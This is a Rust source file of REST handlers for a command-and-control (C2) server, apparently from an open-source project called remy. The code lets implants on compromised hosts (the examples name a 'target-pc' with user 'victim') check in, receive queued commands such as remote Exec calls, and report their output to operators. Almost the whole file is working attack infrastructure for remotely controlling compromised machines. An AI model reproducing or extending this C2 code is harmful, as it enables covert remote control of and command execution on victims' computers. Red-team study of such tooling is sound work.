/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! REST API handlers for the C2 server.
//!
//! These handlers process requests from both implants and the
//! web UI. Implants use the checkin/result endpoints, while
//! operators use the implants/command endpoints.

use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use serde::{Deserialize, Serialize};

use super::sessions::SharedSessions;
use crate::shared::{CheckinRequest, CheckinResponse, CommandResult, CommandType, ImplantInfo};

/// Default sleep interval for implants (seconds).
const DEFAULT_SLEEP_INTERVAL: u64 = 30;

// === IMPLANT ENDPOINTS ===

/// Handles implant check-in requests.
///
/// POST /api/checkin
///
/// Called periodically by implants to:
/// 1. Register/update their presence
/// 2. Receive any pending commands
///
/// # Request Body
/// ```json
/// {
///   "info": {
///     "id": "uuid",
///     "hostname": "target-pc",
///     "os": "Windows 10",
///     "username": "victim",
///     "ip": "192.168.1.100"
///   }
/// }
/// ```
///
/// # Response
/// ```json
/// {
///   "commands": [...],
///   "sleep_interval": 30
/// }
/// ```
pub async fn handle_checkin(
    State(sessions): State<SharedSessions>,
    Json(request): Json<CheckinRequest>,
) -> Json<CheckinResponse> {
    let mut sessions = sessions.write().unwrap();

    // Register/update the implant
    sessions.register_implant(request.info.clone());

    // Get any pending commands for this implant
    let commands = sessions.get_pending_commands(&request.info.id);

    Json(CheckinResponse {
        commands,
        sleep_interval: DEFAULT_SLEEP_INTERVAL,
    })
}

/// Handles command result submissions.
///
/// POST /api/result
///
/// Called by implants after executing a command to report
/// the result back to the server.
///
/// # Request Body
/// ```json
/// {
///   "command_id": "uuid",
///   "implant_id": "uuid",
///   "success": true,
///   "output": "command output here",
///   "data": null
/// }
/// ```
pub async fn handle_result(
    State(sessions): State<SharedSessions>,
    Json(result): Json<CommandResult>,
) -> StatusCode {
    let mut sessions = sessions.write().unwrap();
    sessions.store_result(result);
    StatusCode::OK
}

// === OPERATOR ENDPOINTS ===

/// Lists all connected implants.
///
/// GET /api/implants
///
/// Returns information about all implants that have checked in.
pub async fn list_implants(
    State(sessions): State<SharedSessions>,
) -> Json<Vec<ImplantInfo>> {
    let sessions = sessions.read().unwrap();
    let implants: Vec<ImplantInfo> = sessions
        .get_all_implants()
        .into_iter()
        .cloned()
        .collect();
    Json(implants)
}

/// Gets information about a specific implant.
///
/// GET /api/implants/:id
pub async fn get_implant(
    State(sessions): State<SharedSessions>,
    Path(id): Path<String>,
) -> Result<Json<ImplantInfo>, StatusCode> {
    let sessions = sessions.read().unwrap();
    sessions
        .get_implant(&id)
        .cloned()
        .map(Json)
        .ok_or(StatusCode::NOT_FOUND)
}

/// Request body for queueing a command.
#[derive(Debug, Deserialize)]
pub struct QueueCommandRequest {
    /// The command to execute
    pub command: CommandType,
}

/// Response after queueing a command.
#[derive(Debug, Serialize)]
pub struct QueueCommandResponse {
    /// ID of the queued command (for tracking)
    pub command_id: String,
}

/// Queues a command for an implant.
///
/// POST /api/implants/:id/command
///
/// # Request Body
/// ```json
/// {
///   "command": {
///     "type": "Exec",
///     "args": { "cmd": "whoami" }
///   }
/// }
/// ```
///
/// # Response
/// ```json
/// {
///   "command_id": "uuid"
/// }
/// ```
pub async fn queue_command(
    State(sessions): State<SharedSessions>,
    Path(implant_id): Path<String>,
    Json(request): Json<QueueCommandRequest>,
) -> Result<Json<QueueCommandResponse>, StatusCode> {
    let mut sessions = sessions.write().unwrap();

    sessions
        .queue_command(&implant_id, request.command)
        .map(|cmd_id| Json(QueueCommandResponse { command_id: cmd_id }))
        .ok_or(StatusCode::NOT_FOUND)
}

/// Gets a command result by ID.
///
/// GET /api/results/:id
pub async fn get_result(
    State(sessions): State<SharedSessions>,
    Path(command_id): Path<String>,
) -> Result<Json<CommandResult>, StatusCode> {
    let sessions = sessions.read().unwrap();
    sessions
        .get_result(&command_id)
        .cloned()
        .map(Json)
        .ok_or(StatusCode::NOT_FOUND)
}

/// Gets all results for an implant.
///
/// GET /api/implants/:id/results
pub async fn get_implant_results(
    State(sessions): State<SharedSessions>,
    Path(implant_id): Path<String>,
) -> Json<Vec<CommandResult>> {
    let sessions = sessions.read().unwrap();
    let results: Vec<CommandResult> = sessions
        .get_implant_results(&implant_id)
        .into_iter()
        .cloned()
        .collect();
    Json(results)
}

/// Removes an implant from tracking.
///
/// DELETE /api/implants/:id
pub async fn delete_implant(
    State(sessions): State<SharedSessions>,
    Path(id): Path<String>,
) -> StatusCode {
    let mut sessions = sessions.write().unwrap();
    sessions.remove_implant(&id);
    StatusCode::OK
}
